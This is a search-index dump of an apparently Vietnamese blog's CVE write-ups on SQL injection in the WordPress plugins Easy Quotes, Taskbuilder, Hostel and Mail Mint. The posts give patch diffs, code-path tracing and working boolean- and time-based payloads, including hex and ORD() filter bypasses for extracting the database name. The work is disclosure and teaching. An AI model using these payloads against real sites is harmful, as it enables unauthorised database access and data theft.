POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-58604 trong plugin WordPress Mail Mint trước phiên bản 1.18.6 xuất phát từ việc không sử dụng cơ chế chuẩn bị truy vấn ($wpdb-\u003eprepare) mà truyền trực tiếp dữ liệu từ người dùng vào câu lệnh SQL dẫn đến lỗ hổng SQL Injection. Bản vá chính thức đã thay thế việc nối chuỗi bằng cách dùng $wpdb-\u003eprepare, giúp đảm bảo dữ liệu đầu vào được kiểm soát và an toàn hơn. Key takeaways: Luôn sử dụng $wpdb-\u003eprepare() khi làm việc với database trong WordPress để tránh SQL Injection. Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công. ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Mail Mint Plugin \u003c= 1.18.5 is vulnerable to SQL Injection ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Easy Quotes Plugin.","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng xảy ra trên plugin Easy Quotes của WordPress trước phiên bản 1.2.3. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Taskbuilder Plugin: v1.2.2(vul) và v1.2.3(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rỨng dụng đã đưa trực tiếp dữ liệu từ người dùng vào câu query SQL mà không sử dụng các biện pháp bảo vệ khiến lỗ hổng SQL Injection xảy ra. ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rDùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file includes/quotes-data.php private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } Bản vá sử dụng $wpdb-\u003eprepare() thay vì truyền trực tiếp dữ liệu từ người dùng vào câu query. private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; $sql = $wpdb-\u003eprepare( \"SELECT * FROM %i WHERE `family` = %s\", $tablename, $family ); return $wpdb-\u003eget_row($sql); } Patch diff Có nhiều hàm cũng được vá bằng cách trên, như: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1) Tuy get_fonts_categories() đã được vá nhưng nó không chứa dữ liệu từ người dùng, nên không cần quan tâm public static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-categories'; $sql = $wpdb-\u003eprepare( \"SELECT `category_id`, `category` FROM %i\", $tablename ); return $wpdb-\u003eget_results($sql); } ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"How it work?\rTa khai thác lỗi SQL Injection trong hàm get_family_data($family), các hàm còn lại khai thác tương tự. get_family_data() là hàm public trong class Quotes_Data class Quotes_Data { function __construct() { add_filter('posts_where', array($this, 'posts_where'), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } } get_family_data() được gọi trong 2 hàm get_family() và get_font_variants() của class Quotes_Data, để biết chúng sử dụng ở đâu, ta tìm kiến với từ khóa get_family hoặc get_font_variants Search function Hàm get_font_variants() được gọi trong hàm rest_route_callback_font_variants() của class Quotes_Rest_Route class Quotes_Rest_Route { function __construct() { add_action('rest_api_init', array($this, 'rest_api_init')); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ 'method' =\u003e WP_REST_Server::READABLE, 'callback' =\u003e [$this, 'rest_route_callback_quote'], 'permission_callback' =\u003e '__return_true' ]; register_rest_route('layart/v1', '/quote', $args); // other logic $args['callback'] = [$this, 'rest_route_callback_font_variants']; register_rest_route('layart/v1', '/font-variants', $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u003eget_param('family'); $family = isset($family) ? $family : \"Shadows Into Light\"; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } Hàm khởi tạo của class Quotes_Rest_Route sử dụng add_action(hook_name, callback) với hook_name là rest_api_init để đăng ký các endpoint tùy chỉnh với REST API System của WordPress Callback rest_api_init sử dụng register_rest_route nhiều lần để tạo các endpoint dưới namespace layart/v1 rest_route_callback_font_variants là callback của endpoint /wp-json/layart/v1/font-variants?family=family_name $family mặc định là Shadows Into Light nếu không được truyền trong param. ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#how-it-work"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Detect SQLi\rTa thử kỹ thuật Boolean-based SQL Injection để kiểm tra xem tham số family có dễ bị chèn lệnh SQL hay không. True request: True request Khi đó, câu query thực thi sẽ trở thành: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto'+AND+'1'='1'\" Điều kiện AND '1'='1' luôn đúng =\u003e query hợp lệ, trả về dữ liệu bình thường. False request: False request Khi đó, câu query thực thi sẽ trở thành: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto'+AND+'1'='2'\" Điều kiện AND '1'='2' luôn sai =\u003e query không khớp =\u003e trả về []. ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#detect-sqli"},{"categories":["CVE Analyst"],"collections":null,"content":"Get First Letter of Database Name\rĐiều kiện tiên quyết để dump được hết data là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì toàn bộ data đều dump được. Database name được tôi đặt tên là wordpress nên kí tự đầu tiên là w First letter Response trả về dữ liệu bình thường =\u003e kí tự đầu tiên là w Khi đó, câu query thực thi sẽ trở thành: SELECT * FROM wp_easy-quotes-families WHERE family='Roboto'+AND+SUBSTRING(DATABASE(),1,1)='w'\" ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#get-first-letter-of-database-name"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-26943 trong plugin WordPress Easy Quotes trước phiên bản 1.2.3 xuất phát từ việc không sử dụng cơ chế chuẩn bị truy vấn ($wpdb-\u003eprepare) mà truyền trực tiếp dữ liệu từ người dùng vào câu lệnh SQL dẫn đến lỗ hổng SQL Injection. Bản vá chính thức đã thay thế việc nối chuỗi bằng cách dùng $wpdb-\u003eprepare, giúp đảm bảo dữ liệu đầu vào được kiểm soát và an toàn hơn. Key takeaways: Luôn sử dụng $wpdb-\u003eprepare() khi làm việc với database trong WordPress để tránh SQL Injection. Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công. ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Easy Quotes Plugin \u003c= 1.2.2 is vulnerable to SQL Injection ","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Taskbuilder Plugin.","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng xảy ra trên plugin Taskbuilder của WordPress trước phiên bản 4.0.2. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Taskbuilder Plugin: v4.0.1(vul) và v4.0.2(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rỨng dụng đã xử lý dữ liệu đầu vào trước khi đưa vào câu SQL. Tuy nhiên, trong quá trình xây dựng truy vấn, giá trị này được chèn trực tiếp mà không được bao trong dấu nháy đơn '...'. Điều đó khiến kẻ tấn công có thể chèn thêm các thành phần cú pháp SQL hợp lệ (như OR, AND,...) vào truy vấn, dẫn đến lỗ hổng SQL Injection. ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rDùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file includes/admin/projects/get_users.php Trong phiên bản v4.0.1, biến $proj_id sau khi escape được đưa thẳng vào câu truy vấn mà không có dấu nháy đơn bao quanh: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = $proj_id\" ); Ở bản v4.0.2, truy vấn đã được điều chỉnh bằng cách đặt $proj_id trong dấu nháy đơn sau khi escape: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = '$proj_id'\" ); Bản vá này đảm bảo rằng giá trị $proj_id sau khi escape được coi là một chuỗi literal, không thể thoát ra khỏi dấu nháy đơn để chèn thêm cú pháp SQL, qua đó ngăn chặn tấn công SQL Injection. Patch diff ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"How it work?\rFile architecture: Cấu trúc chung của file hiện tại $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row(\"SELECT * FROM {$wpdb-\u003eprefix}wppm_project WHERE id = $proj_id\"); // Bắt đầu buffer để tạo nội dung chính (body) của modal ob_start(); // ... render HTML danh sách users $body = ob_get_clean(); // Bắt đầu buffer để tạo phần footer của modal ob_start(); // ... render HTML các nút thao tác (Close, Save) $footer = ob_get_clean(); // Trả dữ liệu JSON để frontend hiển thị modal echo json_encode([ 'body' =\u003e $body, 'footer' =\u003e $footer, ]); $proj_id / $project: Lấy dữ liệu project từ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vì xuất trực tiếp, giúp gom nội dung vào biến. $body / $footer: Chứa nội dung HTML động của modal. json_encode(): Trả JSON cho client, có khả năng được sử dụng trong Ajax để hiển thị modal mà không cần refresh trang. File nằm trong thư mục includes cho thấy rằng nó sẽ được gọi ở 1 chức năng nào đó ở nơi khác. Để biết chức năng nào sử dụng nó, ta tìm kiếm với từ khóa get_users.php trong thư mục chứa plugin. Search users 👉 Nó được include trong hàm wppm_get_users() của class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() là callback của action hook trong WordPress. WPPM_Admin construct: final class WPPM_Admin { // constructor public function __construct() { // other action add_action( 'wp_ajax_wppm_get_users',array($this,'wppm_get_users')); // array($this,'wppm_get_users')) = $this::wppm_get_users() // other action } } add_action() là một Plugin API của WordPress, cho phép gắn một callback vào một action hook. wp_ajax_wppm_get_users là tên hook Ajax, với quy tắc đặt tên: wp_ajax_{action} =\u003e Xử lý Ajax khi user đã đăng nhập. wp_ajax_nopriv_{action} =\u003e Xử lý Ajax khi user chưa đăng nhập. Ở đây, action = wppm_get_users. Nghĩa là nếu trong Ajax request bạn gửi action=wppm_get_users tới admin-ajax.php, thì WordPress sẽ tìm callback tương ứng để xử lý, ở đây là wppm_get_users(). 👉 Ta đã biết được action = wppm_get_users, kiểm tra xem Ajax nào sử dụng action này bằng cách tìm từ khóa wppm_get_users trên các file .js trong thư mục chứa plugin. Ajax search Action wppm_get_users là phần data trong request POST của hàm wppm_get_users() Hàm wppm_get_users() sẽ được đặt trong HTML attribute của chức năng project Tạo project mới Truy cập vào project đó Inspect code và tìm hàm wppm_get_users sẽ được đặt ở đâu, hành động nào sẽ gọi nó Ajax inspect 👉 Khi click vào icon bên cạnh Users ajax sẽ hoạt động, gửi request đến server, lấy danh sách các user tham gia project và mã HTML hiển thị nó. Model display ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#how-it-work"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Detect SQLi\rBắt request bằng BurpSuite, gửi request với SQLi payload time base POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+SLEEP(1)) Sqli success Thời gian phản hồi bị delay =\u003e SQL Injection thành công. ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#detect-sqli"},{"categories":["CVE Analyst"],"collections":null,"content":"Get First Letter of Database Name\rĐiều kiện tiên quyết để dump được hết data là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì toàn bộ data đều dump được. Gửi request với SQLi payload boolean base vói proj_id đúng: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name được tôi đặt tên là wordpress nên kí tự đầu tiên là w tương ứng với mã HEX là 0x77 Sử dụng SUBSTRING(STRING,1,1) để lấy kí tự đầu tiên của chuỗi Ở đây, $proj_id bằng 4 vì SUBSTRING('wordpress',1,1)=0x77 là đúng nên SELECT lấy giá trị đúng trong IF(condition, value if true, value if false), 4 là giá trị có thực trong database, nên response trả về chứa danh sách người tham gia dự án Res 1 Sử dụng HEX technique để bypass hàm esc_sql() ở trên, dùng để so sánh khi không sử dùng được ' Gửi request với SQLi payload boolean base vói proj_id sai: POST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Với proj_id không có thực trong database, response sẽ trả về kết quả chứa None Res 2 👉 Ta đã lấy được kí tự đầu tiên của database name bằng kỹ thuật boolean base proj_id đùng: response không chứa None proj_id sai: response chứa None Có thể sử dụng kỹ thuật time base nhưng khi dump số lượng lớn data, thời gian dump sẽ rất lâu ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#get-first-letter-of-database-name"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-39569 trong plugin WordPress Taskbuilder xuất phát từ việc thiếu dấu nháy đơn '...' bao quanh dữ liệu đầu vào trong câu lệnh SQL, khiến dữ liệu người dùng có thể được diễn giải như một phần của câu lệnh SQL hợp lệ. Bản vá ở phiên bản 4.0.2 đã khắc phục vấn đề bằng cách đưa $proj_id vào trong '...', đảm bảo nó luôn được xử lý như một literal string trong SQL. Key takeaways: Ưu tiên sử dụng prepared statements ($wpdb-\u003eprepare() trong WordPress) thay vì tự chèn dữ liệu vào query. Đối với các plugin WordPress, cần test kỹ lưỡng các Ajax endpoint vì đây là nơi dễ xuất hiện SQLi và XSS nhất. Người quản trị cần thường xuyên cập nhật plugin/theme để nhận bản vá kịp thời. ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Taskbuilder project mnagement tool Plugin \u003c= 4.0.1 is vulnerable to SQL Injection ","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng trong plugin Hostel trước phiên bản 1.1.5.7. Do dữ liệu đầu vào không được xử lý đúng cách, điều này có thể cho phép kẻ tấn công tương tác trực tiếp với cơ sở dữ liệu, bao gồm nhưng không giới hạn ở việc đánh cắp dữ liệu. CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, dùng để quản lý đặt phòng trên WordPress, chứa lỗi SQL Injection tại tham số ob trong phần Manage Bookings. ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Background\rHostel Plugin cho phép tạo trang web nhà trọ, khách sạn nhỏ hoặc BnB bằng WordPress. Nó cung cấp: Form đặt phòng Lịch phòng Quản lý bookings ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#background"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploitation\r","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#exploitation"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.6(vul) và v1.1.5.7(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Code Comparison\rSử dụng diff tool so sánh sự khác biệt giữa 2 version if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } if(!empty($_GET['ob'])) { $ob = sanitize_text_field($_GET['ob']); if(!in_array($ob, ['tB.id', 'tB.contact_name', 'tB.contact_email', 'tB.from_date', 'tB.amount_paid', 'tB.status'])) { $ob = 'tB.id'; } $orderby = \"ORDER BY $ob $dir\"; } 👉 Bản vá sử dụng whitelist để giới hạn các cột có thể được sắp xếp, nếu không hợp lệ trả về 'tB.id'. Analysis: Lỗ hổng xuất hiện khi param ob được truyền trực tiếp vào mệnh đề ORDER BY thông qua hàm sanitize_text_field(), chỉ escape mà không filter SQLi. ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#code-comparison"},{"categories":["CVE Analyst"],"collections":null,"content":"Detect SQLi\rĐể inject được, ta cần phải xác định toàn bộ câu query được được sử dụng ở đây $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); Cấu query nằm trong nhánh default của cấu trúc switch. Toàn bộ đoạn xử lý naỳ thuộc về hàm static manage() của class WPHostelBookings. class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { case 'add': // add handle break; case 'edit': // edit handle break; // view/print booking details. Will allow also to confirm/cancel case 'view': // view handle break; // list bookings default: // another logic if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); // another logic break; } } } Trong WordPress, plugin giao tiếp với core thông qua Plugin API (Hook System). Do đó, để xác định nơi hàm manage() được gọi, ta có thể tìm kiếm từ khóa \"manage\" trong thư mục chứa plugin. Search Trong file models/hostel.php ta có hàm: class class WPHostel { // another logic static function menu() { // we use 'hostelpro_manage' for consistency with the pro version $wphostel_caps = current_user_can('manage_options') ? 'manage_options' : 'hostelpro_manage'; add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __('Settings', 'wphostel'), __('Settings', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __(\"Manage Rooms\", 'wphostel'), __(\"Manage Rooms\", 'wphostel'), $wphostel_caps, 'wphostel_rooms', array('WPHostelRooms', \"manage\")); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); add_submenu_page('wphostel_options', __(\"Unavailable Dates\", 'wphostel'), __(\"Unavailable Dates\", 'wphostel'), $wphostel_caps, 'wphostel_unavailable', array('WPHostelBookings', \"unavailable\")); add_submenu_page('wphostel_options', __(\"Email Log\", 'wphostel'), __(\"Email Log\", 'wphostel'), $wphostel_caps, 'wphostel_emaillog', array('WPHostelHelp', \"email_log\")); add_submenu_page('wphostel_options', __(\"Help\", 'wphostel'), __(\"Help\", 'wphostel'), $wphostel_caps, 'wphostel_help', array('WPHostelHelp', \"index\")); } // another logic } Ở đây: add_menu_page() tạo menu chính trong Admin Dashboard. add_submenu_page() thêm các submenu con cho menu đó. Tham số $callback là một callback function sẽ được gọi khi người dùng click vào menu/submenu. Ví dụ: // add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = '', $icon_url = '', $position = null); add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = ''); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); // array('WPHostelBookings', \"manage\")); =\u003e WPHostelBookings::manage() Tất cả menu/submenu này đều được đăng ký bên trong hàm static menu() của class WPHostel. Do đó, để xác định nơi hàm menu() được gọi, ta có thể tìm kiếm từ khóa menu trong thư mục chứa plugin. Menu UI Debugging Chức năng bị lỗi nằm trong Booking Manager, vì vậy ta truy cập vào submenu Manager Bookings trên UI Admin Dashboard. Ngay trước nhánh default có comment // list bookings =\u003e cho thấy đoạn code này xử lý việc liệt kê và","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:2:3","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#detect-sqli"},{"categories":["CVE Analyst"],"collections":null,"content":"Dump Data from Database\rBypass ' using ORD(): Để dump dữ liệu của database ta cần thử để lấy ký tự đầu tiên của database name. Do sanitize_text_field() loại bỏ ', ta không dùng được payload so sánh trực tiếp. Thay vào đó dùng ORD() để so sánh ký tự theo ASCII: GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=past\u0026ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026dir=ASC HTTP/1.1 Thành công bypass =\u003e có thể trích xuất tên database. ORD bypass Bypass ' using Hex encoding (extend) Ngoài ORD() ta có thể sử dụng Hex encoding để bypass GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=past\u0026ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026dir=ASC HTTP/1.1 Thành công bypass =\u003e có thể trích xuất tên database. Hex encoding bypass ","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:2:4","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/#dump-data-from-database"},{"categories":["CVE Analyst"],"collections":null,"content":"Remediation\rCập nhật lên Hostel Plugin 